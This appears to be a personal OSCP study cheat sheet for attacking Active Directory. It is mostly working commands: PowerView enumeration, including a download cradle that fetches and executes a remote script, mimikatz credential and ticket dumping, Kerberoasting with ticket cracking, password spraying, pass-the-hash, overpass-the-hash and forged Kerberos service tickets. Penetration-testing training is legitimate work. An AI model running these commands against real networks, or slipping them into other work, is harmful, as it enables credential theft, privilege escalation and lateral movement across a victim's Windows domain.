# OSCP-Cheat-Sheets-AD

https://www.ired.team/
https://0xsp.com/offensive/privilege-escalation-cheatsheet



## Active Directory Enumeration

```console
net user
net user /domain
net user admin /domain
net group /domain
```

Get-ADUser	# Require administrative privileges to use

```console
powershell -executionpolicy bypass -File enum-ad.ps1
```


## Enumerate Service Principal Names
```console
$domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
$PDC = ($domainObj.PdcRoleOwner).Name
$SearchString = "LDAP://"
$SearchString += $PDC + "/"
$DistinguishedName = "DC=$($domainObj.Name.Replace('.', ',DC='))"
$SearchString += $DistinguishedName
$Searcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]$SearchString)
$objDomain = New-Object System.DirectoryServices.DirectoryEntry
$Searcher.SearchRoot = $objDomain
$Searcher.filter="serviceprincipalname=*http*"
$Result = $Searcher.FindAll()
Foreach($obj in $Result)
{
  Foreach($prop in $obj.Properties)
  {
    $prop
  }
}
```
Get-SPN
https://github.com/EmpireProject/Empire/blob/master/data/module_source/situational_awareness/network/Get-SPN.ps1

GET-SPN -type service -search "MSSQLSvc"
GET-SPN -type service -search "HTTP"
GET-SPN -type service -search "*"





## Enumerate logged-in and sessions users
```console
powershell -executionpolicy bypass
PS C:\AD> Import-Module .\PowerView.ps1
PS C:\AD> Get-NetLoggedon -ComputerName Tiger01;
PS C:\AD> Get-NetSession -ComputerName dc01

PS C:\AD> IEX(New-Object System.Net.WebClient).DownloadString('http://<URL>/powerview.ps1');Get-NetLoggedon -ComputerName Tiger01;
```


## Active Directory Authentication
WDigest Windows 7 and Windows Server 2008 R2

Active Directory --> Kerberos640 || NTLM authentication

### Kerberos Authentication - tickets

Process
1. User logs in workstation -- -AS-REQ_TGT --> KDC.  # REQ_TGT = timestamp encrypted with hash password NTLM + user
2. KDC -- AS-REP --> client. # AS_REP = Session key(encrypted user password hash) + TGT (key session encrypted krbtgt NT hash KDC)(include info user and groups).
#Finish KDC considers the client authentication complete

To access resources of the domain, such as application with a registered SPN
1. Client -- TGS_REQ --> DC-KDC  # TGS_REQ (user and timestamp encrypted using the session key + SPN of the resource + TGT)
2. DC-KDC TGT decrypted_secret_key -- TGS_REP -->  Client.   # TGS_REP (SPN + session key to client and SPN) encrypted_session_key_TGT + (service ticket) encrypted_password_hash
3. Cliente -- AP_ REQ --> Application.  # AP_REQ = Username + timestamp encrypted with the session key associated with the service ticket
4. Application -- Service Autenticacion --> Client.


### Cached Credential Storage and Retrieval
```console
mimikatz.exe
privilege::debug
sekurlsa::logonpasswords
```
Tickets stored in memory
```console
sekurlsa::tickets
```
TGS allow to access SPN
TGT allow to request TGS


### Service Account Attacks

Request Ticket
```console
PS C:\>Add-Type -AssemblyName System.IdentityModel
PS C:\>New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList 'HTTP/CorporateWebServer.corporate.com'
PS C:\> klist
```
Export Ticket
```console
mimikatz # kerberos::list /export
```
Crack pwd with Ticket
```console
kali@kali:~$ python /usr/share/kerberoast/tgsrepcrack.py rockyou.txt 1-40a50000-user@HTTP~Corporatedb.corporate.com-CORPORATE.COM.kirbi
```

Invoke-Kerberoast.ps1
https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/Invoke-Kerberoast.ps1
Enumerate SPN, request service tickets, and export in a format ready for cracking in both John the Ripper and Hashcat


### Low and Slow Password Guessing
```console
PS C:> .\Spray-Passwords.ps1 -Pass pass123 -Admin  # -File to wordlist, -Admin test acount admin
```

## Active Directory Lateral Movement
### Pass-the-Hash
https://www.hackingarticles.in/lateral-movement-pass-the-hash-attack/
```console
kali@kali:~$ pth-winexe -U user%aad3b435b51404eeaad3b435b51404ee:2892d26cdf84d7a70e2eb3b9f05c425e //10.11.0.22 cmd
```
pth-wine
https://github.com/byt3bl33d3r/pth-toolkit


### Overpass-the-Hash - Convert NTLM to ticket
Dumps the cached password hashes
```console
mimikatz # sekurlsa::logonpasswords
```
```console
mimikatz # sekurlsa::pth /user:sec_admin /domain:corporate.com /ntlm:e2b475c11da2a0748290d87aa966c327 /run:PowerShell.exe
PS C:\Windows\system32> klist   # list the cached Kerberos tickets
PS C:\Windows\system32> net use \\dc01    # No Kerberos tickets have been cached
PS C:\Windows\system32> klist
PS C:> .\PsExec.exe \\dc01 cmd.exe
```

### Pass-the-ticket - takes advantage of the TGS

Get SID
```console
whoami /user
```
```console
#flush any existing Kerberos ticket
mimikatz # kerberos::purge
mimikatz # kerberos::list
```
```console
mimikatz # kerberos::golden /user:sec /domain:corporate.com /sid:S-1-5-21-1602875587-2787523311-2599479668 /target:CorporateWebServer.corporate.com /service:HTTP /rc4:E2B475C11DA2A0748290D87AA966C327 /ptt
```
